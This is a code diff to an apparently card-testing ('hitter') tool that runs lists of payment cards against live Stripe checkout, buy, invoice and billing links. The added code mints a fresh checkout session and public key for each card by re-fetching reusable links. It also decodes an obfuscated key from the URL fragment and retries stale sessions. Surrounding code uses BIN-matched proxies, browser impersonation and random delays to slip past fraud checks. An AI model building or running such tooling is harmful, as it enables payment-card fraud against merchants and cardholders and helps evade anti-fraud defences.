@@ -1236,6 +1236,9 @@ class StripeAPIHitter:
         return result
 
 class ConcurrentHitter:
+    # Reusable link domains — each visit mints a fresh cs_live checkout session
+    REUSABLE_DOMAINS = ['billing.stripe.com', 'buy.stripe.com', 'invoice.stripe.com']
+    
     def __init__(self, user_id: int, url: str, cards: list, update_callback=None):
         self.user_id = user_id
         self.url = url
@@ -1247,10 +1250,53 @@ class ConcurrentHitter:
         self.url_info = None
         self.update_callback = update_callback
         self.is_running = True
+        self._reusable = any(d in self.url.lower() for d in self.REUSABLE_DOMAINS)
+        self._session_lock = asyncio.Lock()  # serialize session fetches to avoid thundering herd
         
+    async def _fetch_fresh_session(self) -> dict:
+        """Re-fetch the reusable URL to mint a fresh cs_live + pk_live pair.
+        Returns dict with cs_token, pk_key or None on failure."""
+        for _ in range(3):
+            try:
+                proxy_data = await ProxyManager.get_random(self.user_id)
+                proxies = None
+                if proxy_data:
+                    auth = f"{proxy_data['username']}:{proxy_data['password']}@" if 'username' in proxy_data else ""
+                    proxy_url = f"http://{auth}{proxy_data['server'].replace('http://', '')}"
+                    proxies = {"http": proxy_url, "https": proxy_url}
+                
+                async with cffi_requests.AsyncSession(impersonate="chrome120", proxies=proxies) as s:
+                    resp = await s.get(self.url, timeout=8)
+                    final_url = str(resp.url) if hasattr(resp, 'url') else self.url
+                    html = resp.text
+                    
+                    cs_token = StripeAPIExtractor.extract_cs_live(final_url, html)
+                    pk_key = None
+                    
+                    # Try hash fragment decode first
+                    check_url = final_url if '#' in final_url else self.url
+                    hash_idx = check_url.find('#')
+                    if hash_idx != -1:
+                        import urllib.parse, base64, json as _json
+                        decoded = urllib.parse.unquote(check_url[hash_idx+1:])
+                        try:
+                            raw_bytes = base64.b64decode(decoded + '==')
+                            json_str = ''.join(chr(b ^ 5) for b in raw_bytes)
+                            data = _json.loads(json_str)
+                            pk_key = data.get('apiKey')
+                        except: pass
+                    if not pk_key:
+                        pk_key = StripeAPIExtractor.extract_pk_live(html)
+                    
+                    if cs_token and pk_key:
+                        return {'cs_token': cs_token, 'pk_key': pk_key}
+            except Exception:
+                continue
+        return None
+
     async def analyze_first(self):
         url_lower = self.url.lower()
-        if 'cs_' not in url_lower and 'buy.stripe.com' not in url_lower and 'invoice.stripe.com' not in url_lower:
+        if 'cs_' not in url_lower and 'buy.stripe.com' not in url_lower and 'invoice.stripe.com' not in url_lower and 'billing.stripe.com' not in url_lower:
             if self.update_callback:
                 await self.update_callback({"status": "error", "error": "This does not appear to be a valid Stripe link. Need a checkout, buy, or invoice link."})
             return False
@@ -1342,8 +1388,29 @@ class ConcurrentHitter:
                 bin_info = await BINLookup.lookup(card['card'])
                 bin_country = bin_info.get('country', '')
                 for try_idx in range(max_retries):
+                    # --- Fresh session per card for reusable links ---
+                    cs_token = self.url_info['cs_token']
+                    pk_key = self.url_info['pk_key']
+                    raw_amount = self.url_info.get('raw_amount')
+                    locked_email = self.url_info.get('locked_email')
+                    
+                    if self._reusable:
+                        async with self._session_lock:
+                            fresh = await self._fetch_fresh_session()
+                        if fresh:
+                            cs_token = fresh['cs_token']
+                            pk_key = fresh['pk_key']
+                            # Re-fetch payment data for the fresh session to get correct amount
+                            try:
+                                api_data = await StripeAPIExtractor.fetch_payment_data(self.user_id, cs_token, pk_key)
+                                if api_data.get('success'):
+                                    raw_amount = api_data.get('raw_amount') or raw_amount
+                                    locked_email = api_data.get('locked_email') or locked_email
+                            except Exception:
+                                pass
+                    
                     proxy_data = await ProxyManager.get_geo_matched(self.user_id, bin_country) if bin_country else await ProxyManager.get_random(self.user_id)
-                    hitter = StripeAPIHitter(self.url_info['pk_key'], self.url_info['cs_token'], proxy_data, self.url_info.get('raw_amount'), self.url_info.get('locked_email'))
+                    hitter = StripeAPIHitter(pk_key, cs_token, proxy_data, raw_amount, locked_email)
                     
                     import random
                     await asyncio.sleep(random.uniform(0.05, 0.2))  # Micro-random delay per card attempt  
@@ -1373,11 +1440,18 @@ class ConcurrentHitter:
                     result['amount'] = self.url_info.get('amount')
                     result['merchant'] = self.url_info.get('merchant')
                     
-                    err_str = result.get('error', '')
+                    err_str = result.get('error', '') or ''
+                    decline = result.get('decline_code', '') or ''
                     should_retry = False
-                    if result.get('decline_code') == 'exception':
+                    
+                    # Retry on network failures
+                    if decline == 'exception':
                         if any(k in err_str for k in ['Timeout', 'ERR_', 'closed', 'refused', 'reset', 'disconnected', 'socket', 'Navigation failed']):
                             should_retry = True
+                    
+                    # Retry on resource_missing — session was stale, fetch a new one
+                    if decline == 'resource_missing' and self._reusable:
+                        should_retry = True
                             
                     if should_retry:
                         if try_idx < max_retries - 1:
